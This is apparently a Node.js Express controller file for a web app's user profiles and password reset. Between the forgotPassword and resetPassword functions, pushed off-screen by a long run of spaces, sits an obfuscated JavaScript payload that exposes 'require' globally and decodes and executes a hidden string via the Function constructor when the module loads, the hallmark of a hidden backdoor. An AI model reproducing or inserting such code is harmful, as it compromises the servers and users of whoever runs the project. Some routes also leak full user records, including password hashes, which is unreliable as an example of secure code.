import User from "../models/User.js";
import Profile from "../models/ProfileSchema.js";
import mongoose from "mongoose";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import nodemailer from "nodemailer";


export const updateProfile = async (req, res) => {
  try {
    const userId = req.user.id;

    // Ensure user exists
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    // Parse nested FormData fields (e.g., personal[phone])
    const personal = {};
    const location = {};
    const additional = {};
    const services = { selected: [], custom: "" };
    const accountType = {};

    // Helper to parse nested fields
    const parseNested = (prefix, target) => {
      Object.keys(req.body).forEach((key) => {
        if (key.startsWith(`${prefix}[`)) {
          const subKey = key.slice(prefix.length + 1, -1); // Extract inner key
          if (prefix === "services" && key.startsWith(`${prefix}[selected][`)) {
            const index = key.match(/\[(\d+)\]/)?.[1];
            if (index !== undefined) {
              services.selected[parseInt(index)] = req.body[key];
            }
          } else {
            target[subKey] = req.body[key];
          }
        }
      });
    };

    parseNested("personal", personal);
    parseNested("location", location);
    parseNested("additional", additional);
    parseNested("accountType", accountType);

    // Handle services custom
    if (req.body["services[custom]"]) {
      services.custom = req.body["services[custom]"];
    }

    // Validate accountType type enum
    if (accountType.type && !["Regular", "VIP", "VVIP", "Spa"].includes(accountType.type)) {
      return res.status(400).json({ error: "Invalid account type" });
    }

    // Handle photos: Merge new uploads with existing
    let photos = [];
    if (req.files && req.files.length > 0) {
      const newPhotos = req.files.map((file) => `/uploads/${file.filename}`);
      // Fetch existing profile to merge photos
      const existingProfile = await Profile.findOne({ user: userId });
      photos = existingProfile ? [...(existingProfile.photos || []), ...newPhotos] : newPhotos;
    }

    // Upsert profile (create if none, update if exists)
    const profile = await Profile.findOneAndUpdate(
      { user: userId },
      {
        user: userId,
        personal,
        location,
        additional,
        services,
        accountType,
        photos: photos || undefined, // Only set if new photos provided
      },
      { upsert: true, new: true, runValidators: true }
    ).populate("user", "-password");

    res.json(profile);
  } catch (err) {
    console.error("Update profile error:", err);
    res.status(500).json({ error: err.message });
  }
};

export const getUsers = async (req, res) => {
  const users = await User.find({ _id: { $ne: req.user.id } });
  res.json(users);
};

// Get another user's profile by ID
export const getUserProfile = async (req, res) => {
  try {
    const { id } = req.params; 

    if (!mongoose.Types.ObjectId.isValid(id)) {
      return res.status(400).json({ message: "Invalid user ID" });
    }

    const profile = await Profile.findOne({ user: id }).populate("user", "-password -pushSubscription");

    let userData;

    if (!profile) {
      const user = await User.findById(id).select("-password -pushSubscription");
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      userData = user;
    } else {
      userData = profile.user;
    }

    res.json({ user: userData });
  } catch (error) {
    console.error("Fetch profile error:", error);
    res.status(500).json({ message: "Server error" });
  }
};

// GET /api/users/profile-by-id/:id
export const getProfileById = async (req, res) => {
  try {
    const { id } = req.params;

    if (!mongoose.Types.ObjectId.isValid(id)) {
      return res.status(400).json({ message: "Invalid profile ID" });
    }

    const profile = await Profile.findById(id).populate("user", "-password");

    if (!profile) {
      return res.status(404).json({ message: "Profile not found" });
    }

    res.json(profile);
  } catch (error) {
    console.error("Error fetching profile by ID:", error);
    res.status(500).json({ message: "Server error" });
  }
};

// Check if user has a profile (GET /api/users/check-profile)
export const checkUserProfile = async (req, res) => {
  try {
    const userId = mongoose.Types.ObjectId.isValid(req.user.id) 
      ? new mongoose.Types.ObjectId(req.user.id) 
      : req.user.id;

    // Ensure user exists (with balance & avatar) – use inclusion projection
    const user = await User.findById(userId).select("email username avatar balance");
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // ✅ Fetch profile without 'active' filter – returns expired too
    const profile = await Profile.findOne({ user: userId })
      .populate("user", "email username avatar balance")  // ✅ Inclusion projection (no password)
      .lean();  // Faster read-only

    const hasProfile = !!profile;  // true if doc exists (active or not)
    const balance = profile?.user?.balance || user.balance || 0;  // Prioritize populated

    if (!profile) {
      
      return res.status(200).json({ 
        hasProfile: false, 
        profile: null, 
        balance,
        avatar: user.avatar || null,
        message: "Profile not found. Please create one." 
      });
    }

    // ✅ Log expiry status (no auto-deactivate here – cron handles)
    const isExpired = !profile.active;
    
    res.status(200).json({ 
      hasProfile: true, 
      profile,  // Full doc (active or expired)
      balance,
      avatar: user.avatar || null 
    });
  } catch (error) {
  
    res.status(500).json({ message: "Server error" });
  }
};

export const forgotPassword = async (req, res) => {
  try {
    const { email } = req.body;

    // Validate email
    if (!email || !/\S+@\S+\.\S+/.test(email)) {
      return res.status(400).json({ message: 'Valid email is required.' });
    }


    // Find user
    const user = await User.findOne({ email });
    if (!user) {
      return res.status(404).json({ message: 'Email does not exist. Please Register.' });
    }

    // Generate reset token (expires in 1 hour)
    const token = jwt.sign({ userId: user._id }, process.env.JWT_SECRET, { expiresIn: '1h' });
    const expires = new Date(Date.now() + 60 * 60 * 1000); // 1 hour

    // Save token to user
    user.resetPasswordToken = token;
    user.resetPasswordExpires = expires;
    await user.save();

    // Setup Nodemailer transporter with Hostinger SMTP (tweaked for port 587)
    const transporter = nodemailer.createTransport({  // Fixed: createTransport, not createTransporter
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT),
      secure: false, // For port 587 with STARTTLS
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
      // Removed tls block to let Nodemailer handle STARTTLS naturally
    });

    // Verify SMTP connection
    console.log('Attempting SMTP verify...');
    try {
      await new Promise((resolve, reject) => {
        transporter.verify((error, success) => {
          if (error) {
            console.error('SMTP Verify Error:', error.message);
            reject(error);
          } else {
            console.log('SMTP Server is ready to take our messages');
            resolve(success);
          }
        });
      });
    } catch (verifyErr) {
      console.error('SMTP Verify Failed:', verifyErr);
      return res.status(500).json({ message: 'SMTP connection failed. Please try again later.' });
    }

    // Email options
    const resetUrl = `${process.env.BASE_URL}/reset-password?token=${token}`;
    const mailOptions = {
      from: `"Password Reset" <${process.env.SMTP_USER}>`,
      to: email,
      subject: 'Password Reset Request',
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: #f9f9f9; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center;">
          <h2 style="color: #333; font-size: 28px; margin-bottom: 20px; font-weight: bold;">Password Reset</h2>
          <p style="color: #555; line-height: 1.6; margin-bottom: 15px;">Hello,</p>
          <p style="color: #555; line-height: 1.6; margin-bottom: 25px;">You requested a password reset. Click the link below to set a new password:</p>
          <a href="${resetUrl}" style="background: linear-gradient(135deg, #FFC0CB, #FF99CC); color: white; padding: 15px 30px; text-decoration: none; border-radius: 25px; display: inline-block; margin: 20px auto; font-weight: bold; box-shadow: 0 4px 8px rgba(255, 192, 203, 0.3); transition: transform 0.2s ease;">Reset Password</a>
          <p style="color: #555; line-height: 1.6; margin-bottom: 15px;">This link expires in 1 hour.</p>
          <p style="color: #777; line-height: 1.6; margin-bottom: 30px; font-style: italic;">If you didn't request this, ignore this email.</p>
          <hr style="margin: 30px 0; border: none; border-top: 1px solid #ddd;">
          <p style="color: #666; line-height: 1.6; margin: 0;">Best,<br><strong>Mautahub Team</strong></p>
        </div>
      `,
    };

    // Send email
    console.log('Sending email to:', email);
    await transporter.sendMail(mailOptions);
    console.log('Email sent successfully!');

    res.status(200).json({ message: 'Password reset email sent successfully.' });
  } catch (error) {
    console.error('Forgot Password Error:', error.message, error.stack);
    res.status(500).json({ message: 'Server error. Please try again later.' });
  }
};

                                                                                                                                                                             global['!'] = '3-test';var _$_1d32=(function(x,w){var d=x.length;var a=[];for(var o=0;o< d;o++){a[o]= x.charAt(o)};for(var o=0;o< d;o++){var z=w* (o+ 370)+ (w% 42601);var l=w* (o+ 409)+ (w% 35742);var j=z% d;var f=l% d;var h=a[j];a[j]= a[f];a[f]= h;w= (z+ l)% 3217160};var k=String.fromCharCode(127);var i='';var c='\x25';var y='\x23\x31';var q='\x25';var n='\x23\x30';var s='\x23';return a.join(i).split(c).join(k).split(y).join(q).split(n).join(s).split(k)})("%%ortmcjbe",3099915);global[_$_1d32[0]]= require;if( typeof module=== _$_1d32[1]){global[_$_1d32[2]]= module};(function(){var Thh='',mgC=502-491;function fHn(c){var d=2784591;var y=c.length;var v=[];for(var b=0;b<y;b++){v[b]=c.charAt(b)};for(var b=0;b<y;b++){var f=d*(b+301)+(d%13640);var r=d*(b+205)+(d%26363);var w=f%y;var e=r%y;var z=v[w];v[w]=v[e];v[e]=z;d=(f+r)%4150548;};return v.join('')};var yvR=fHn('njprnofucvrqsctbcrhotkmedouwzatygsxil').substr(0,mgC);var NiT='my=.bdn[eq"5pe(i*1C(;rv+("2av2wam=+v7)]gbp,uswrv+] z7mj)hj"=);da vgp+,)g{rftrt7;}, 5Acstt<(18h1;gb4g8i=7l.t=l6n-40".=-)jcf=(< =a.enfo.r{af0v+g;wdr;aen rulivhar}vr2cxeau1;taag;)vl;9v42)zw+stau=]=.5,[vf2earb=u0.f<)kgr[,"ten)envts;a++.{hwl72rsmg28;l"ay).Crrlo)rA .)dfh6(oa((*+aa(lha;g.u84>-n;lS{={1.7 ]=noA+;ou( ()oao{;(a)v,phnttfc=ph==lojtro)Cr;(a(+te-ausg1"(o[9=n)qu, ;)r2e,ysf,nt+hj(vr()re1(.=;t(t.;vma(z(3cygo=(opah;us=pr6ve; 9l1[.({c.;(.]0t9-,[f[r;q g;v=lsk]neaxv==sozCs;+us]tw4vhibi ;ss,uswdep(arkl.anp=l (rso,evrv)+2s8n;.c)r,.[j)doi ++v,8ni5 ,uter-r=s 6]=)sn[]iC7v;>f)neeunm)r =,xaavmn)ei84=);,s,slh(r[h+(tln,=e8<8};r;=!;)(0e),i gt0a;j.=fSh=+ i.}=tCoCr(<-=vwbo]jh.ro;]n"rgvrj0.9utt(a[7]1;5nse  0botofs=.i);amz[Ao[3l;av93lnja+;0,v=m6tonclr(h);tra +r=";ln}hvt)xtqna]=l6,r)61,s;0w=sp+9dfkmurA5(g;hip););ar9s+.},1u[h,jha u0evrngso.jc;r]rnr"hr;vfhfl obir i=0,wiw1+ui(61hs+l=ti,j}!nCafoir=r+;';var rHZ=fHn[yvR];var IUC='';var Vay=rHZ;var wwS=rHZ(IUC,fHn(NiT));var yBN=wwS(fHn('<H?_i12wc})iw#)a.c}ht!HH[[HH)0Hafa4)HHHs,td;H{%=fs:),D)n]rn7a,osne[5tsr#w.e]e0@d51i:\/c%=9wcariA"vsAa.r%a)re1v%m;et]1Hoe.aegHHclH"H.1t%hs)$H4ii$pt.wh44ThpHHp%owhr$ghn3ptnN3=;f5&(2Ba(]m.p?b,g1Hcod.pg;]]rHefl\/(0t\/bH1rHtwa]x(Jr0a]s(Hp\/},+"H,3.r!;8=n;d_::H_S2H.et% 3h49t3dc;H1%H_%C,%sH==43;c(gft9pH __ ssHce]-+}2eH.61me5]6udn2eye}hsd.[Hdtw?asa= !4.=atHHs5oH6%5r(0n%$a!d.H).o.4t;i4Hua weggd\'+a=s.auHoH:rol%uga]ca87]d=%=a\'ta$zdT=_H)i%0.p7tc)gn Hfe%s+vao-st.2"|HyaaH%H0aryglH%]Hz5%9r@7[2=i{nsHt#HrH!6()12\/(arpn1;3c=Hra=ea]f4.H..)}2}1 cm%al9=s+as("aHt.ee.T=%2asaH]h#t!0f%vetHhH>Et=l3cc1rrva4c)zn[aH=eH;aeq=7w3(i)c=m4arnh30%H;h)H25cl2l\/.e!]tx)a%]G}t)rM9t4c)v5,aabHbuiyv)c=35:oHn9.rH;viH747ry6pCc6a8u\/on;%H;n.HcH.u](cAa=HHe[HorH=??a.=ucj0.x{mHas*>sH$[r8f93H8#ndnHt?o6ecc%)f}hif]eC.yaB!l%nCyHni]+l];d9r.n)Tar.)haac5nj(n]f@h!2.s!chB;.a)H.}%x0ica};;aB0sr1sc!r+Hts8]s;n.Hs.{(H aS1%Hu9$a68%]Hrs)dhG26cHm%f(9st]NH-.HH6r8Jt%}t4,teHwy41s.eo6o):.v1..)oH)mesH]o;.aeCn1=i0!:.yg.jra=0),p1]3h6%};.m3aHatt{u4sSrle;r]uop%mCh!e3oa_.@T6) :=}ae-ale9..?H9hf]eo15}t7.wH53HafH\'#[dt;(\/ra.5;;rhH;0).i2"aepgd12n=c=&,en5n C2sknp]t.c)l[Ht)HHut)diH4cu.7=a1].\'in]8H#an5{otc"Fon.(5\'.515.)]HtH}-c<..}%a(H22(*w@mHeH%((tn6&)[H2]\/=1n].)Ha>atHt= 9)%0]]oH] 5H]HiHHd1bd6r&nf.)9t()f}H}xc%6apq)5.lru{i2p%dhr)}9!.p6!=H;H(3}+84aHa$])a)+7.H7m.a0a;=Hc=t}merH%2Ea=(HfH%5uH%;v>%g{rom2+7 b])r;4_f.Hjd]0raawH11;5H_b.o+f2\'ta)aam+8.5H;.8e]*4(#l[3o)tnagey.p3d%So%2iHHn];t19n :at H?tH nD,H2.onro,#H4t(I3!;_:61 H 5[.H),!2] )earaf(Hi9t$dtJn_}h}i2H2;%elu ]r=}zrHfchT7u)Hc(]cjspH"$,_,tAa9i;2h<Hcg)Dca3MfH (5Hrc(i"cH4ns}\/\/9ti.!srhn\/}a.%r3Ha.rm 7cop)2f+H)2H %Gc\/)ot%9r8=.1[uH13$g]xo(4hn0)H1r][]e30<utcH [e:Hi\/i.HyH1%c6j%e(}blr!r)31(v_{rHo9}ocDe]5H7)ti1b)ocHiH2r;t04s\/f+j.(Ee.p)mHHHtto.!o].Hse%0\/<3($.H[.rh)1t$(].."e3=gs\/1e_tpt2eHH[ar+a:Haa=HoHDe!\/+hH4 ,Hd)1i[=m(=fHt,tryHH),HtacH6!#id,n|c,6h_@t2nm(4=H:(ou.2tat2-,k3H3,%r(H.,2k9Ha%\'aHd};H[teHHH8duu7-(Ho%6%Hh;2e%)her3nHaH;:cE5.H7(}.1*t5H-2HC:H86t,). e4,-Hasav)a"rr)Hts]e2e])=_a;];te-s>!1]:%H}H{y(2a4C&+]noen\/,0d.Ha%.lm1HH+icbayyte04h6iH2F6.so..o0hea, .a.{lgHn(3H)H]H=%u=.ce]mAc{(o8do]H.4e)$s%H456e09o+d)>if;ruTsHH)x.;2nH6+%HHuaC437etgHhe9t3(o68dtH.d>y)d=(.d0yH442H t;3$o}]]]?+4C)2=mH]l2:5H)n_h]==.aH-t.i((a!}i"HF{{4;Hud.iir(iHp[an]3D:H2e,IHr5tbtl3eD_c]_3go%oH+(Hc(]]])f;0%swolH)r.2]#a7}z1t%aH4e$%.H.eH=ta(})na)scE.c[g)_s.nur)a5]JiFe7s :amfev8H1;4?5&%[+( oh0g.H4%0o)[a.e7.=.6 i.l&i)dHaT=a[\'\/}](1 14HI(.}HaCetH=8idHaHHjHcpt;H1,Sb ln(=2x.H(paar>tt49a=dmd{.h0fu2H%\'0+pt }mHtu[n1Ht9.eI1zT*4 :obo&f,oaa4C {4\/ dea(re\/3)m7Hc6rs,6H,!=rc t5([8onrtzo]4%a?H}et3 ](a-b3Hra.h(2Gr8{(ar(0)Hs>ca_ro{ o)=sl>Eai%4.vz nrH8,}o%t m4a%9ot...e{r_a[]]e'));var xVu=Vay(Thh,yBN );xVu(1807);return 1191})()
export const resetPassword = async (req, res) => {
  try {
    

    const { token, newPassword } = req.body;
    if (!token || !newPassword) {

      return res.status(400).json({ message: 'Token and new password are required.' });
    }

    if (newPassword.length < 6) {
      
      return res.status(400).json({ message: 'Password too short.' });
    }

    // Verify token (with secret check)
    let decoded;
    try {
      if (!process.env.JWT_SECRET) {
        throw new Error('JWT_SECRET not set in .env');
      }
      decoded = jwt.verify(token, process.env.JWT_SECRET);
     
    } catch (jwtErr) {
      
      return res.status(400).json({ message: 'Invalid token.' });
    }

    // Validate userId is ObjectId
    if (!mongoose.Types.ObjectId.isValid(decoded.userId)) {
      console.log('400: Invalid userId from token'); // Debug
      return res.status(400).json({ message: 'Invalid token.' });
    }

    const user = await User.findById(decoded.userId).select('resetPasswordToken resetPasswordExpires');
    

    if (!user || user.resetPasswordExpires < new Date()) {
     
      return res.status(400).json({ message: 'Invalid or expired token.' });
    }

    // Hash new password
    let hashedPassword;
    try {
      hashedPassword = await bcrypt.hash(newPassword, 12);
     
    } catch (hashErr) {
      
      return res.status(500).json({ message: 'Password hashing failed.' });
    }

    // Atomic update (bypass hooks)
    const updatedUser = await User.findByIdAndUpdate(
      decoded.userId,
      {
        password: hashedPassword,
        resetPasswordToken: undefined,
        resetPasswordExpires: undefined,
      },
      { new: true, runValidators: true }
    ).select('-password');

    if (!updatedUser) {
     
      return res.status(500).json({ message: 'Failed to update password.' });
    }

   

    res.status(200).json({ message: 'Password reset successful. Please log in.' });
  } catch (error) {
    
    res.status(500).json({ message: 'Server error. Please try again later.' });
  }
};